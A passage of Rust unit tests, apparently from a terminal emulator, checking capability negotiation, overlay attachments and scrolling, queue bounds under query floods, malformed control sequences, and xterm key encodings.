        assert!(rich.attachments.is_empty());
        assert!(rich.granted.is_empty());
    }

    #[test]
    fn attach_before_query_is_ignored() {
        let mut emulator = Emulator::new_experimental(20, 2, 10);
        let mut rich = RichSession::default();
        let (tx, _rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);
        let attach = encode_attach_cell_rect(&AttachCellRect {
            id: 1,
            row: 0,
            col: 0,
            rows: 1,
            cols: 12,
            text: "status:ok".into(),
        })
        .unwrap();
        let events = emulator.feed(&attach);
        handle_control_events(&events, &mut rich, &tx);
        assert!(rich.attachments.is_empty());
        assert!(rich.granted.is_empty());
    }

    #[test]
    fn incompatible_major_does_not_grant_features() {
        let mut emulator = Emulator::new_experimental(20, 2, 10);
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);
        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(1, 0),
        })
        .unwrap();
        let events = emulator.feed(&query);
        handle_control_events(&events, &mut rich, &tx);
        assert!(rx.try_recv().is_err());
        assert!(rich.granted.is_empty());
    }

    #[test]
    fn version_zero_query_does_not_grant_cell_rect() {
        let mut emulator = Emulator::new_experimental(20, 2, 10);
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);
        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(0, 0),
        })
        .unwrap();
        let events = emulator.feed(&query);
        handle_control_events(&events, &mut rich, &tx);
        let reply_bytes = rx.recv().expect("empty-feature reply still sent");
        let body = std::str::from_utf8(&reply_bytes[2..reply_bytes.len() - 2]).unwrap();
        match decode_body(body).unwrap() {
            ControlMessage::CapabilityReply(reply) => {
                assert!(reply.features.is_empty());
            }
            other => panic!("unexpected {other:?}"),
        }
        assert!(!rich.granted.contains(&Feature::HybridAttachCellRect));

        let attach = encode_attach_cell_rect(&AttachCellRect {
            id: 1,
            row: 0,
            col: 0,
            rows: 1,
            cols: 12,
            text: "status:ok".into(),
        })
        .unwrap();
        let events = emulator.feed(&attach);
        handle_control_events(&events, &mut rich, &tx);
        assert!(rich.attachments.is_empty());
    }

    #[test]
    fn experimental_on_replies_and_attaches_cell_rect() {
        let mut emulator = Emulator::new_experimental(20, 2, 10);
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);

        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(7).unwrap(),
            max_version: ProtocolVersion::new(0, 1),
        })
        .unwrap();
        let events = emulator.feed(&query);
        handle_control_events(&events, &mut rich, &tx);
        let msg = rx.recv().expect("capability reply");
        let reply_bytes = &msg.bytes;
        let body = std::str::from_utf8(&reply_bytes[2..reply_bytes.len() - 2]).unwrap();
        match decode_body(body).unwrap() {
            ControlMessage::CapabilityReply(reply) => {
                assert_eq!(reply.request_id.get(), 7);
                assert!(reply.supports(Feature::HybridAttachCellRect));
            }
            other => panic!("unexpected {other:?}"),
        }
        // Simulate writer-thread grant after successful PTY write.
        if let Some(grant) = msg.capability_grant {
            rich.apply_grant(grant);
        }
        assert!(rich.granted.contains(&Feature::HybridAttachCellRect));

        let attach = encode_attach_cell_rect(&AttachCellRect {
            id: 1,
            row: 0,
            col: 0,
            rows: 1,
            cols: 12,
            text: "status:ok".into(),
        })
        .unwrap();
        // Classic fallback text also printed.
        let mut chunk = b"underneath\r\n".to_vec();
        chunk.extend_from_slice(&attach);
        let events = emulator.feed(&chunk);
        handle_control_events(&events, &mut rich, &tx);
        assert_eq!(rich.attachments.len(), 1);

        let overlays = overlays_from(&rich.attachments, emulator.screen().rows());
        let composed = PlainTextRenderer::render_with_overlays(emulator.screen(), &overlays);
        assert!(composed.contains("status:ok"));
        // Classic grid still has the printed line.
        let classic = PlainTextRenderer::render(emulator.screen());
        assert!(classic.contains("underneath"));

        let detach = encode_detach(1).unwrap();
        let events = emulator.feed(&detach);
        handle_control_events(&events, &mut rich, &tx);
        assert!(rich.attachments.is_empty());
    }

    #[test]
    fn scroll_translates_and_detaches_cell_rect() {
        let mut emulator = Emulator::new_experimental(8, 2, 10);
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);
        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(0, 1),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &query);
        test_apply_queued_capability_grants(&rx, &mut rich);

        let attach = encode_attach_cell_rect(&AttachCellRect {
            id: 1,
            row: 0,
            col: 0,
            rows: 1,
            cols: 4,
            text: "STAT".into(),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &attach);
        assert_eq!(rich.attachments[&1].row, 0);

        // Fill both rows then scroll once: attachment moves to row -1 → fully outside → detach.
        process_rich_chunk(&mut emulator, &mut rich, &tx, b"aaaaaaaa\r\nbbbbbbbb\r\n");
        assert!(
            rich.attachments.is_empty(),
            "attachment should detach once fully scrolled off"
        );
    }

    #[test]
    fn scroll_keeps_partially_visible_attachment() {
        let mut emulator = Emulator::new_experimental(4, 3, 10);
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);
        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(0, 1),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &query);
        test_apply_queued_capability_grants(&rx, &mut rich);

        let attach = encode_attach_cell_rect(&AttachCellRect {
            id: 1,
            row: 1,
            col: 0,
            rows: 2,
            cols: 4,
            text: "ABCD1234".into(),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &attach);

        // Scroll once: row 1 → 0; still partially/fully visible.
        process_rich_chunk(&mut emulator, &mut rich, &tx, b"xxxx\r\nyyyy\r\nzzzz\r\n");
        let attach = rich.attachments.get(&1).expect("still attached");
        assert!(attach.row < 1, "row should translate upward with scroll");
        let overlays = overlays_from(&rich.attachments, emulator.screen().rows());
        assert!(!overlays.is_empty());
    }

    #[test]
    fn scroll_before_attach_does_not_translate_new_attachment() {
        // Scroll first, then negotiate (grant after write), then attach at row 0.
        // New attach must stay at row 0 (must not inherit pre-attach scroll delta).
        // grant is not live until capability reply is written.
        let mut emulator = Emulator::new_experimental(8, 2, 10);
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);

        for line in [
            "aaaaaaaa\r\n",
            "bbbbbbbb\r\n",
            "cccccccc\r\n",
            "dddddddd\r\n",
        ] {
            process_rich_chunk(&mut emulator, &mut rich, &tx, line.as_bytes());
        }

        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(0, 1),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &query);
        test_apply_queued_capability_grants(&rx, &mut rich);
        assert!(rich.granted.contains(&Feature::HybridAttachCellRect));

        let attach = encode_attach_cell_rect(&AttachCellRect {
            id: 1,
            row: 0,
            col: 0,
            rows: 1,
            cols: 4,
            text: "STAT".into(),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &attach);

        let attach = rich
            .attachments
            .get(&1)
            .expect("STAT attach after scroll must stay attached at row 0");
        assert_eq!(attach.row, 0, "must not inherit pre-attach scroll delta");
        assert_eq!(attach.text, "STAT");
    }

    #[test]
    fn attach_before_scroll_in_one_feed_translates_existing_attachment() {
        let mut emulator = Emulator::new_experimental(8, 2, 10);
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);

        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(0, 1),
        })
        .unwrap();
        let attach = encode_attach_cell_rect(&AttachCellRect {
            id: 1,
            row: 0,
            col: 0,
            rows: 1,
            cols: 4,
            text: "STAT".into(),
        })
        .unwrap();

        let mut chunk = Vec::new();
        chunk.extend_from_slice(&query);
        chunk.extend_from_slice(&attach);
        // After attach: fill + scroll so the row-0 attachment leaves the viewport.
        chunk.extend_from_slice(b"aaaaaaaa\r\nbbbbbbbb\r\n");

        process_rich_chunk(&mut emulator, &mut rich, &tx, &chunk);
        let _ = rx.try_recv();

        assert!(
            rich.attachments.is_empty(),
            "attachment present before scroll in the same feed must translate/detach"
        );
    }

    #[test]
    fn process_rich_chunk_flood_stays_responsive() {
        let mut emulator = Emulator::new_experimental(80, 24, 1000);
        let mut rich = RichSession::default();
        let (tx, _rx) = mpsc::sync_channel(CHILD_WRITE_QUEUE_CAP);
        let flood = "y\n".repeat(32 * 1024);
        let start = Instant::now();
        process_rich_chunk(&mut emulator, &mut rich, &tx, flood.as_bytes());
        let elapsed = start.elapsed();
        assert!(
            elapsed < test_time_budget(Duration::from_secs(1)),
            "plain flood under experimental-rich stalled ({elapsed:?})"
        );
        assert!(rich.attachments.is_empty());
        let text = emulator
            .screen()
            .viewport_range()
            .map(|range| emulator.screen().extract_text(range))
            .unwrap_or_default();
        assert!(
            text.contains('y'),
            "flood must still paint the classic grid"
        );
    }

    #[test]
    fn v1_negotiate_grants_viewport_and_limits() {
        let mut emulator = Emulator::new_experimental(12, 2, 0);
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel(CHILD_WRITE_QUEUE_CAP);
        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(0, 2),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &query);
        test_apply_queued_capability_grants(&rx, &mut rich);
        assert!(rich.granted.contains(&Feature::HybridAttachCellRect));
        assert!(rich.granted.contains(&Feature::HybridOverlayViewport));
        assert!(rich.granted.contains(&Feature::InputRichFocus));
        assert_eq!(rich.region_limit, DEFAULT_LIMIT_REGIONS as usize);
    }

    #[test]
    fn v01_query_reply_is_byte_identical_to_spike() {
        let query = CapabilityQuery {
            request_id: RequestId::new(3).unwrap(),
            max_version: ProtocolVersion::new(0, 1),
        };
        let spike = CapabilityReply::for_spike_query(query).unwrap();
        let v1 = CapabilityReply::for_v1_query(query).unwrap();
        assert_eq!(spike, v1);
        assert_eq!(
            encode_capability_reply(&spike).unwrap(),
            encode_capability_reply(&v1).unwrap()
        );
    }

    #[test]
    fn update_mutates_text_without_geometry() {
        let mut emulator = Emulator::new_experimental(12, 2, 0);
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel(CHILD_WRITE_QUEUE_CAP);
        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(0, 2),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &query);
        test_apply_queued_capability_grants(&rx, &mut rich);
        let attach = encode_attach_cell_rect(&AttachCellRect {
            id: 1,
            row: 0,
            col: 0,
            rows: 1,
            cols: 4,
            text: "STAT".into(),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &attach);
        let update = encode_update(&UpdateAttachment {
            id: 1,
            text: "NEXT".into(),
            runs: Vec::new(),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &update);
        let got = rich.attachments.get(&1).unwrap();
        assert_eq!(got.text, "NEXT");
        assert_eq!(got.row, 0);
        assert_eq!(got.cols, 4);
    }

    #[test]
    fn viewport_stays_pinned_while_cell_rect_translates() {
        let mut emulator = Emulator::new_experimental(8, 2, 10);
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel(CHILD_WRITE_QUEUE_CAP);
        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(0, 2),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &query);
        test_apply_queued_capability_grants(&rx, &mut rich);
        let attach = encode_attach_cell_rect(&AttachCellRect {
            id: 1,
            row: 0,
            col: 0,
            rows: 1,
            cols: 4,
            text: "STAT".into(),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &attach);
        let viewport = encode_attach_viewport(&AttachViewport {
            id: 2,
            row: 0,
            col: 0,
            rows: 1,
            cols: 3,
            text: "HUD".into(),
            runs: Vec::new(),
        })
        .unwrap();
        process_rich_chunk(&mut emulator, &mut rich, &tx, &viewport);
        process_rich_chunk(&mut emulator, &mut rich, &tx, b"aaaaaaaa\r\nbbbbbbbb\r\n");
        assert!(!rich.attachments.contains_key(&1));
        let hud = rich.attachments.get(&2).unwrap();
        assert_eq!(hud.kind, AttachKind::Viewport);
        assert_eq!(hud.row, 0);
        assert_eq!(hud.text, "HUD");
        let overlays = overlays_from(&rich.attachments, emulator.screen().rows());
        assert_eq!(overlays.len(), 1);
        assert_eq!(overlays[0].text, "HUD");
    }

    #[test]
    fn limit_regions_enforced_for_v1() {
        let mut emulator = Emulator::new_experimental(20, 4, 0);
        let mut rich = RichSession::default();
        rich.apply_grant(CapabilityGrant {
            features: Feature::V1.into_iter().collect(),
            region_limit: 2,
        });
        let (tx, _rx) = mpsc::sync_channel(CHILD_WRITE_QUEUE_CAP);
        for id in 1..=3 {
            let attach = encode_attach_cell_rect(&AttachCellRect {
                id,
                row: 0,
                col: 0,
                rows: 1,
                cols: 1,
                text: "X".into(),
            })
            .unwrap();
            process_rich_chunk(&mut emulator, &mut rich, &tx, &attach);
        }
        assert_eq!(rich.attachments.len(), 2);
        assert!(rich.attachments.contains_key(&1));
        assert!(rich.attachments.contains_key(&2));
        assert!(!rich.attachments.contains_key(&3));
    }

    #[test]
    fn child_write_queue_is_bounded_under_query_flood() {
        let mut emulator = Emulator::new_experimental(40, 2, 10);
        let mut rich = RichSession::default();
        // Capacity 1: first reply may queue; subsequent try_sends drop.
        let (tx, rx) = mpsc::sync_channel(1);
        let query = encode_capability_query(CapabilityQuery {
            request_id: RequestId::new(1).unwrap(),
            max_version: ProtocolVersion::new(0, 1),
        })
        .unwrap();
        // Do not drain rx — simulate a blocked/slow PTY writer consumer.
        for _ in 0..64 {
            let events = emulator.feed(&query);
            handle_control_events(&events, &mut rich, &tx);
        }
        // At most one message retained; rest dropped via try_send failure.
        let mut count = 0;
        while rx.try_recv().is_ok() {
            count += 1;
        }
        assert!(count <= 1, "queue retained {count} messages, expected <= 1");
        // Memory bound: attachments and grant state remain finite regardless of flood.
        assert!(rich.attachments.len() <= MAX_CELL_RECT_ATTACHMENTS);
    }

    #[test]
    fn malformed_control_does_not_corrupt_grid() {
        let mut emulator = Emulator::new_experimental(16, 1, 0);
        let events = emulator.feed(b"ok\x1b_Prismattyc;cap;q;id=0;max=0.1\x1b\\!");
        let mut rich = RichSession::default();
        let (tx, rx) = mpsc::sync_channel::<ChildWrite>(CHILD_WRITE_QUEUE_CAP);
        handle_control_events(&events, &mut rich, &tx);
        assert!(rx.try_recv().is_err());
        assert!(rich.attachments.is_empty());
        let text = PlainTextRenderer::render(emulator.screen());
        assert!(text.starts_with("ok!"));
    }
}

#[cfg(test)]
mod keyboard_contract_tests {
    use super::*;

    #[test]
    fn legacy_navigation_and_function_keys_keep_xterm_wire_sequences() {
        let navigation = [
            (KeyCode::Up, "A"),
            (KeyCode::Down, "B"),
            (KeyCode::Right, "C"),
            (KeyCode::Left, "D"),
            (KeyCode::Home, "H"),
            (KeyCode::End, "F"),
        ];
        for (code, suffix) in navigation {
            assert_eq!(
                encode_key_to_pty(KeyEvent::new(code, KeyModifiers::NONE), 0).unwrap(),
                format!("\x1b[{suffix}").as_bytes()
            );
            assert_eq!(
                encode_key_to_pty(KeyEvent::new(code, KeyModifiers::ALT), 0).unwrap(),
                format!("\x1b[1;3{suffix}").as_bytes()
            );
        }
        for (code, number) in [
            (KeyCode::Insert, 2),
            (KeyCode::Delete, 3),
            (KeyCode::PageUp, 5),
            (KeyCode::PageDown, 6),
        ] {
            assert_eq!(
                encode_key_to_pty(KeyEvent::new(code, KeyModifiers::NONE), 0).unwrap(),
                format!("\x1b[{number}~").as_bytes()
            );
            assert_eq!(
                encode_key_to_pty(KeyEvent::new(code, KeyModifiers::CONTROL), 0).unwrap(),
                format!("\x1b[{number};5~").as_bytes()
            );
        }
        let plain = [
            "\x1bOP", "\x1bOQ", "\x1bOR", "\x1bOS", "\x1b[15~", "\x1b[17~", "\x1b[18~", "\x1b[19~",
            "\x1b[20~", "\x1b[21~", "\x1b[23~", "\x1b[24~",
        ];
        let shifted = [
            "\x1b[1;2P",
            "\x1b[1;2Q",
            "\x1b[1;2R",
            "\x1b[1;2S",
            "\x1b[15;2~",
            "\x1b[17;2~",
            "\x1b[18;2~",
            "\x1b[19;2~",
            "\x1b[20;2~",
            "\x1b[21;2~",
            "\x1b[23;2~",
            "\x1b[24;2~",
        ];
        for n in 1..=12 {
            for (modifiers, expected) in [
                (KeyModifiers::NONE, plain[n - 1]),
                (KeyModifiers::SHIFT, shifted[n - 1]),
            ] {
                assert_eq!(
                    encode_key_to_pty(KeyEvent::new(KeyCode::F(n as u8), modifiers), 0).unwrap(),
                    expected.as_bytes()
                );
            }
        }
        assert!(encode_key_to_pty(KeyEvent::new(KeyCode::Null, KeyModifiers::NONE), 0).is_none());
    }
}
